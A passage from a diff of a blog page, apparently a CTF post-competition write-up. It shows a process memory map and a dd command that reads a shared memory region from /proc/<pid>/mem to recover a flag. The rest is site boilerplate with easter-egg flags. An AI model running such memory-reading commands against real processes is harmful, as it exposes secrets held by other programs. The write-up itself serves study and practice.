class="line">55f067df1000-55f067f1d000 rw-p 00000000 00:00 0                          [heap]</span><br><span class="line">7fef24ced000-7fef24cef000 r--p 00000000 fe:00 10504887                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/mmap.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef24cef000-7fef24cf2000 r-xp 00002000 fe:00 10504887                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/mmap.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef24cf2000-7fef24cf4000 r--p 00005000 fe:00 10504887                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/mmap.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef24cf4000-7fef24cf5000 r--p 00006000 fe:00 10504887                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/mmap.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef24cf5000-7fef24cf6000 rw-p 00007000 fe:00 10504887                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/mmap.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef24cf6000-7fef24d36000 rw-p 00000000 00:00 0 </span><br><span class="line">7fef24d36000-7fef24d3b000 r--p 00000000 fe:00 45380399                   /usr/lib/x86_64-linux-gnu/libzstd.so.1.5.7</span><br><span class="line">7fef24d3b000-7fef24dea000 r-xp 00005000 fe:00 45380399                   /usr/lib/x86_64-linux-gnu/libzstd.so.1.5.7</span><br><span class="line">7fef24dea000-7fef24dfe000 r--p 000b4000 fe:00 45380399                   /usr/lib/x86_64-linux-gnu/libzstd.so.1.5.7</span><br><span class="line">7fef24dfe000-7fef24dff000 r--p 000c8000 fe:00 45380399                   /usr/lib/x86_64-linux-gnu/libzstd.so.1.5.7</span><br><span class="line">7fef24dff000-7fef24e00000 rw-p 000c9000 fe:00 45380399                   /usr/lib/x86_64-linux-gnu/libzstd.so.1.5.7</span><br><span class="line">7fef24e00000-7fef24ef7000 r--p 00000000 fe:00 45425126                   /usr/lib/x86_64-linux-gnu/libcrypto.so.3</span><br><span class="line">7fef24ef7000-7fef25278000 r-xp 000f7000 fe:00 45425126                   /usr/lib/x86_64-linux-gnu/libcrypto.so.3</span><br><span class="line">7fef25278000-7fef253af000 r--p 00478000 fe:00 45425126                   /usr/lib/x86_64-linux-gnu/libcrypto.so.3</span><br><span class="line">7fef253af000-7fef25432000 r--p 005ae000 fe:00 45425126                   /usr/lib/x86_64-linux-gnu/libcrypto.so.3</span><br><span class="line">7fef25432000-7fef25435000 rw-p 00631000 fe:00 45425126                   /usr/lib/x86_64-linux-gnu/libcrypto.so.3</span><br><span class="line">7fef25435000-7fef25438000 rw-p 00000000 00:00 0 </span><br><span class="line">7fef25440000-7fef25441000 r--p 00000000 fe:00 10504897                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/fcntl.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef25441000-7fef25443000 r-xp 00001000 fe:00 10504897                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/fcntl.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef25443000-7fef25445000 r--p 00003000 fe:00 10504897                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/fcntl.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef25445000-7fef25446000 r--p 00004000 fe:00 10504897                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/fcntl.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef25446000-7fef25447000 rw-p 00005000 fe:00 10504897                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/fcntl.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef25447000-7fef25449000 r--p 00000000 fe:00 10504836                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/_sha3.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef25449000-7fef2545e000 r-xp 00002000 fe:00 10504836                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/_sha3.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef2545e000-7fef25460000 r--p 00017000 fe:00 10504836                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/_sha3.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef25460000-7fef25461000 r--p 00018000 fe:00 10504836                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/_sha3.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef25461000-7fef25462000 rw-p 00019000 fe:00 10504836                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/_sha3.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef25462000-7fef25464000 r--p 00000000 fe:00 10504847                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/_blake2.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef25464000-7fef2546b000 r-xp 00002000 fe:00 10504847                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/_blake2.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef2546b000-7fef2546d000 r--p 00009000 fe:00 10504847                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/_blake2.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef2546d000-7fef2546e000 r--p 0000a000 fe:00 10504847                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/_blake2.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef2546e000-7fef2546f000 rw-p 0000b000 fe:00 10504847                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/_blake2.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef2546f000-7fef25472000 r--p 00000000 fe:00 45353345                   /usr/lib/x86_64-linux-gnu/libz.so.1.3.1</span><br><span class="line">7fef25472000-7fef25486000 r-xp 00003000 fe:00 45353345                   /usr/lib/x86_64-linux-gnu/libz.so.1.3.1</span><br><span class="line">7fef25486000-7fef2548d000 r--p 00017000 fe:00 45353345                   /usr/lib/x86_64-linux-gnu/libz.so.1.3.1</span><br><span class="line">7fef2548d000-7fef2548e000 r--p 0001d000 fe:00 45353345                   /usr/lib/x86_64-linux-gnu/libz.so.1.3.1</span><br><span class="line">7fef2548e000-7fef2548f000 rw-p 0001e000 fe:00 45353345                   /usr/lib/x86_64-linux-gnu/libz.so.1.3.1</span><br><span class="line">7fef25492000-7fef25499000 r--p 00000000 fe:00 45351292                   /usr/lib/x86_64-linux-gnu/ossl-modules/legacy.so</span><br><span class="line">7fef25499000-7fef254aa000 r-xp 00007000 fe:00 45351292                   /usr/lib/x86_64-linux-gnu/ossl-modules/legacy.so</span><br><span class="line">7fef254aa000-7fef254b0000 r--p 00018000 fe:00 45351292                   /usr/lib/x86_64-linux-gnu/ossl-modules/legacy.so</span><br><span class="line">7fef254b0000-7fef254b5000 r--p 0001d000 fe:00 45351292                   /usr/lib/x86_64-linux-gnu/ossl-modules/legacy.so</span><br><span class="line">7fef254b5000-7fef254b6000 rw-p 00022000 fe:00 45351292                   /usr/lib/x86_64-linux-gnu/ossl-modules/legacy.so</span><br><span class="line">7fef254b6000-7fef254b9000 r--p 00000000 fe:00 10504875                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/_hashlib.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef254b9000-7fef254bd000 r-xp 00003000 fe:00 10504875                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/_hashlib.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef254bd000-7fef254bf000 r--p 00007000 fe:00 10504875                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/_hashlib.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef254bf000-7fef254c0000 r--p 00008000 fe:00 10504875                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/_hashlib.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef254c0000-7fef254c1000 rw-p 00009000 fe:00 10504875                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/_hashlib.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef254c1000-7fef25501000 rw-p 00000000 00:00 0 </span><br><span class="line">7fef25501000-7fef25503000 r--p 00000000 fe:00 10504889                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/select.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef25503000-7fef25506000 r-xp 00002000 fe:00 10504889                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/select.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef25506000-7fef25508000 r--p 00005000 fe:00 10504889                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/select.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef25508000-7fef25509000 r--p 00006000 fe:00 10504889                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/select.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef25509000-7fef2550a000 rw-p 00007000 fe:00 10504889                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/select.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef2550a000-7fef2550d000 r--p 00000000 fe:00 10504874                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/math.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef2550d000-7fef25515000 r-xp 00003000 fe:00 10504874                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/math.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef25515000-7fef25519000 r--p 0000b000 fe:00 10504874                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/math.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef25519000-7fef2551a000 r--p 0000e000 fe:00 10504874                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/math.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef2551a000-7fef2551b000 rw-p 0000f000 fe:00 10504874                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/math.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef2551b000-7fef256c0000 rw-p 00000000 00:00 0 </span><br><span class="line">7fef256c0000-7fef2571a000 r--p 00000000 fe:00 46036259                   /usr/lib/locale/yue_HK/LC_CTYPE</span><br><span class="line">7fef2571a000-7fef2572b000 r--p 00000000 fe:00 45358791                   /usr/lib/x86_64-linux-gnu/libm.so.6</span><br><span class="line">7fef2572b000-7fef257a8000 r-xp 00011000 fe:00 45358791                   /usr/lib/x86_64-linux-gnu/libm.so.6</span><br><span class="line">7fef257a8000-7fef25808000 r--p 0008e000 fe:00 45358791                   /usr/lib/x86_64-linux-gnu/libm.so.6</span><br><span class="line">7fef25808000-7fef25809000 r--p 000ed000 fe:00 45358791                   /usr/lib/x86_64-linux-gnu/libm.so.6</span><br><span class="line">7fef25809000-7fef2580a000 rw-p 000ee000 fe:00 45358791                   /usr/lib/x86_64-linux-gnu/libm.so.6</span><br><span class="line">7fef2580a000-7fef25832000 r--p 00000000 fe:00 45358788                   /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7fef25832000-7fef25997000 r-xp 00028000 fe:00 45358788                   /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7fef25997000-7fef259ed000 r--p 0018d000 fe:00 45358788                   /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7fef259ed000-7fef259f1000 r--p 001e2000 fe:00 45358788                   /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7fef259f1000-7fef259f3000 rw-p 001e6000 fe:00 45358788                   /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7fef259f3000-7fef25a00000 rw-p 00000000 00:00 0 </span><br><span class="line">7fef25a00000-7fef25a65000 r--p 00000000 fe:00 10497237                   /home/swordreforge/.pyenv/versions/3.8.0/lib/libpython3.8.so.1.0</span><br><span class="line">7fef25a65000-7fef25c41000 r-xp 00065000 fe:00 10497237                   /home/swordreforge/.pyenv/versions/3.8.0/lib/libpython3.8.so.1.0</span><br><span class="line">7fef25c41000-7fef25d22000 r--p 00241000 fe:00 10497237                   /home/swordreforge/.pyenv/versions/3.8.0/lib/libpython3.8.so.1.0</span><br><span class="line">7fef25d22000-7fef25d27000 r--p 00322000 fe:00 10497237                   /home/swordreforge/.pyenv/versions/3.8.0/lib/libpython3.8.so.1.0</span><br><span class="line">7fef25d27000-7fef25d62000 rw-p 00327000 fe:00 10497237                   /home/swordreforge/.pyenv/versions/3.8.0/lib/libpython3.8.so.1.0</span><br><span class="line">7fef25d62000-7fef25d83000 rw-p 00000000 00:00 0 </span><br><span class="line">7fef25d85000-7fef25d86000 r--p 00000000 fe:00 10504895                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/_heapq.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef25d86000-7fef25d87000 r-xp 00001000 fe:00 10504895                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/_heapq.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef25d87000-7fef25d8a000 r--p 00002000 fe:00 10504895                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/_heapq.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef25d8a000-7fef25d8b000 r--p 00004000 fe:00 10504895                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/_heapq.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef25d8b000-7fef25d8c000 rw-p 00005000 fe:00 10504895                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/_heapq.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef25d8c000-7fef25dce000 rw-p 00000000 00:00 0 </span><br><span class="line">7fef25dd1000-7fef25dd2000 rw-s 00000000 00:01 9630                       /dev/zero (deleted)//这里</span><br><span class="line">7fef25dd2000-7fef25dd6000 r--p 00000000 fe:00 10504849                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/_socket.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef25dd6000-7fef25de1000 r-xp 00004000 fe:00 10504849                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/_socket.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef25de1000-7fef25dea000 r--p 0000f000 fe:00 10504849                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/_socket.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef25dea000-7fef25deb000 r--p 00017000 fe:00 10504849                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/_socket.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef25deb000-7fef25dec000 rw-p 00018000 fe:00 10504849                   /home/swordreforge/.pyenv/versions/3.8.0/lib/python3.8/lib-dynload/_socket.cpython-38-x86_64-linux-gnu.so</span><br><span class="line">7fef25dec000-7fef25ded000 rw-p 00000000 00:00 0 </span><br><span class="line">7fef25ded000-7fef25dee000 rw-p 00000000 00:00 0 </span><br><span class="line">7fef25dee000-7fef25df5000 r--s 00000000 fe:00 45358777                   /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache</span><br><span class="line">7fef25df5000-7fef25df7000 rw-p 00000000 00:00 0 </span><br><span class="line">7fef25df7000-7fef25dfb000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7fef25dfb000-7fef25dfd000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">7fef25dfd000-7fef25dfe000 r--p 00000000 fe:00 45358785                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7fef25dfe000-7fef25e26000 r-xp 00001000 fe:00 45358785                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7fef25e26000-7fef25e31000 r--p 00029000 fe:00 45358785                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7fef25e31000-7fef25e33000 r--p 00034000 fe:00 45358785                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7fef25e33000-7fef25e34000 rw-p 00036000 fe:00 45358785                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7fef25e34000-7fef25e35000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffcd74b4000-7ffcd74d6000 rw-p 00000000 00:00 0                          [stack]</span><br></pre></td></tr></table></figure>
+
+<p>dd if&#x3D;&#x2F;proc&#x2F;510400&#x2F;mem bs&#x3D;1 skip&#x3D;$((0x7fef25dd1000)) count&#x3D;4096 2&gt;&#x2F;dev&#x2F;null | strings<br>flag{test_flag}</p>
+</div>
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <span itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</span>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+            
+            
+                <div class="post-actions text-center clearfix" id="post-actions">
+                
+                    <a class="donate" href="javascript:;" onclick="krOpenDonateModal()"><i class="fa fa-bitcoin"></i> 打赏</a>
+                
+                
+                    <a class="share" href="javascript:;" onclick="krOpenShareModal()"><i class="fa fa-share-alt"></i> 分享</a>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    
+                </div>
+                <div class="pull-date">
+                    <time datetime="2025-10-05T05:52:10.268Z" itemprop="dateModified">最后编辑：2025-10-05</time>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" 白盒代码审计工具—CodeQL安装教程【Liunx】" href="/2025/10/04/codeql使用转载/"><i class="fa fa-angle-left"></i> 上一篇</a>
+            </div>
+            
+            
+        </nav>
+    
+    
+        <div class="comment-post">
+            
+        </div>
+    
+</article>
+
+        
+
+            </section>
+
+            
+                
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/user.svg" alt="Diver" loading="lazy" decoding="auto" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+    <div class="site-meta">
+        <a class="meta-item" href="/archives/">
+            <span class="title">
+                文章
+            </span>
+            <span class="count">
+                3
+            </span>
+        </a>
+        <a class="meta-item" href="/categories/">
+            <span class="title">
+                分类
+            </span>
+            <span class="count">
+                0
+            </span>
+        </a>
+        <a class="meta-item" href="/tags/">
+            <span class="title">
+                标签
+            </span>
+            <span class="count">
+                0
+            </span>
+        </a>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                
+
+            
+                
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2025/10/05/n1-ctf/"><i class="fa fa-book"></i> n1-ctf-赛后复现</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2025/10/04/codeql%E4%BD%BF%E7%94%A8%E8%BD%AC%E8%BD%BD/"><i class="fa fa-book"></i> 白盒代码审计工具—CodeQL安装教程【Liunx】</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2025/10/04/hello-world/"><i class="fa fa-book"></i> 开始的开始</a>
+            
+          
+        
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+            
+
+        
+
+                </div>
+    </div>
+</div>
+
+<footer>
+    <div id="footer">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                            <li>
+                                <a href="https://github.com/kratos-rebirth" target="_blank" rel="nofollow">
+                                    <i class="fa fa-github"></i>
+                                </a>
+                            </li>
+                        
+                            <li>
+                                <a href="/atom.xml" target="_blank" rel="nofollow">
+                                    <i class="fa fa-rss"></i>
+                                </a>
+                            </li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2025 Diver's blog 版权所有.</li>
+                            <li>本站已在风雨中飘摇<span id="kr-since">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>自豪地使用 <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a> 主题</li>
+                            <li>站点由 <a href="https://github.com/Candinya/Kratos-Rebirth/graphs/contributors" target="_blank">Diver</a> 用 <i class="fa fa-heart" style="color:#d43f57"></i> 搭建</li>
+                        </div>
+                        <!-- 额外的追加注入项 -->
+                        
+                            <div>
+                                
+                                    <li>由 <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a> 强力驱动</li>
+                                
+                                    <li>在 <a href="https://github.io" target="_blank">Github Pages</a> 暖心托管</li>
+                                
+                            </div>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                <div class="box theme-box" id="theme-toggle">
+                    <span class="fa fa-adjust"></span>
+                </div>
+            </div>
+            <div id="gotop-box" class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+
+    <div id="kr-donate-modal" class="kr-modal">
+    <div class="kr-modal-bg" onclick="krCloseDonateModal()"></div>
+    <div class="kr-modal-content">
+        <div class="kr-modal-header">
+            <div class="kr-modal-icon">
+                <i class="fa fa-bitcoin"></i>
+            </div>
+            <div class="kr-modal-title">Kernel panic!</div>
+            <button class="kr-modal-close" onclick="krCloseDonateModal()">
+                <i class="fa fa-times-circle"></i>
+            </button>
+        </div>
+        <div class="kr-modal-body">
+            <div class="kr-donate-message"><i class="fa fa-heart" style="color:#d43f57"></i></div>
+            <div class="kr-donate-qr" id="kr-donate-qr">
+                
+                    <img class="kr-donate-placeholder" src="/kernelpanic.jpg" alt="Kernel panic!" />
+                
+            </div>
+            <div class="kr-donate-platforms">
+                
+                    
+                        <button class="kr-donate-platform-button" style="color: skyblue;" title="Pangbai:Do not touch it，icy！" onclick="krDonateModalShowPlatformQR('flag{A_east3r_egg_in_payment_m0d}', 'skyblue')">
+                            <i class="fa fa-credit-card"></i>
+                        </button>
+                    
+                
+            </div>
+        </div>
+    </div>
+</div>
+<script defer src="/js/kr-modal/donate.min.js"></script>
+
+
+
+
+    <div id="kr-share-modal" class="kr-modal">
+    <div class="kr-modal-bg" onclick="krCloseShareModal()"></div>
+    <div class="kr-modal-content">
+        <div class="kr-modal-header">
+            <div class="kr-modal-icon">
+                <i class="fa fa-share-alt"></i>
+            </div>
+            <div class="kr-modal-title">分享</div>
+            <button class="kr-modal-close" onclick="krCloseShareModal()">
+                <i class="fa fa-times-circle"></i>
+            </button>
+        </div>
+        <div class="kr-modal-body">
+            <div class="kr-share-message">flag2=flag{share_with_your_friends}</div>
+            <div class="kr-share-qr" id="kr-share-qr"></div>
+            <div class="kr-share-platforms">
+                
+                    <button class="kr-share-platform-button" style="color: #62b6e7;" title="重返主页" onclick="krShareModalOpenPlatform('https://swordreforge.github.io')">
+                        <svg fill="currentColor" width="18" height="18" viewBox="0 0 329 388"><path d="M0,36.226c0,-19.993 16.233,-36.226 36.226,-36.226c13.788,0 25.787,7.719 31.908,19.068l188.366,229.845l0,-111.259c-6.356,5.508 -14.645,8.843 -23.707,8.843c-19.994,0 -36.226,-16.232 -36.226,-36.226c-0,-8.551 2.968,-16.413 7.93,-22.613l-0.015,-0.013l56.614,-69.08c6.2,-11.073 18.047,-18.565 31.63,-18.565c19.994,0 36.227,16.233 36.227,36.226l-0,314.644c-0,19.994 -16.233,36.226 -36.227,36.226c-13.166,0 -24.701,-7.039 -31.044,-17.555l-189.229,-230.899l-0,212.228c-0,19.994 -16.233,36.226 -36.227,36.226c-19.993,0 -36.226,-16.232 -36.226,-36.226l0,-314.644Z" /></svg>
+                    </button>
+                
+            </div>
+        </div>
+    </div>
+</div>
+<script defer src="/js/kr-modal/share.min.js"></script>
+
+
+
+<!-- 额外的追加注入项 -->
+
+
+        <script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+
+  <script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
+
+
+
+  <script defer src="/vendors/viewerjs@1.11.6/dist/viewer.min.js"></script>
+
+
+<script defer src="/js/kr-core.min.js"></script>
+
+
+  <script defer src="/js/kr-pjax.min.js"></script>
+
+
+<!-- 额外的追加注入项 -->
+
+
+    </body>
+</html>
